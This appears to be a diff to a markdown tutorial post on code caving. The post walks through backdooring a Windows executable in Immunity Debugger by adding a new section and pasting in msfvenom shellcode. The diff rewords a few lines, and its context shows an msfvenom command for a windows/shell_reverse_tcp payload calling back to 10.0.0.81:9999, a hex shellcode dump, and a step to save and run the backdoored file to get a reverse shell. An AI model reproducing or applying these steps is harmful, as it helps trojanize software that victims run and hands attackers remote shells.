@@ -38,7 +38,7 @@ Now you can press `F7` and step into the newly edited JMP call, this will lead t
 
 Now you also want to edit the new section in Immunity and add a `PUSHFD` to the start of your malicious new section. Assemble it when done.
 
-Now you can generate your msfvenom payload, use a `EXITFUNC=seh` to ensure it handles proper exiting to add to the stability and reliability of your shell. Generate it in hex format you you can now copy past this into Immunity Debugger into your new malicious section.
+Now you can generate your msfvenom payload, use a `EXITFUNC=seh` to ensure it handles proper exiting to add to the stability and reliability of your shell. Generate it in hex format since it's going to be directly pasted into the binary/machine code.
 
 ```
 └─▪ ./msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.81 LPORT=9999 -f hex EXITFUNC=seh
@@ -54,9 +54,11 @@ a05680a000051680200270f89e66a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd
 3c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbfe0e32ea68a695bd9dffd53c067c0a80fbe07
 505bb4713726f6a0053ffd5
 ```
+You you can now copy past this into Immunity Debugger into your new malicious section.
+
 ![code caving 7](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/code_caving_7.png)
 
-Now you just need to save the patched file and run it to obtain that sweet reverse shell.
+You can run it within Immunity, but if you want to export the now backdoored file, you just need to save the patched file and run it to obtain that sweet reverse shell.
 
 ![code caving 8](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/code_caving_8.png)
 
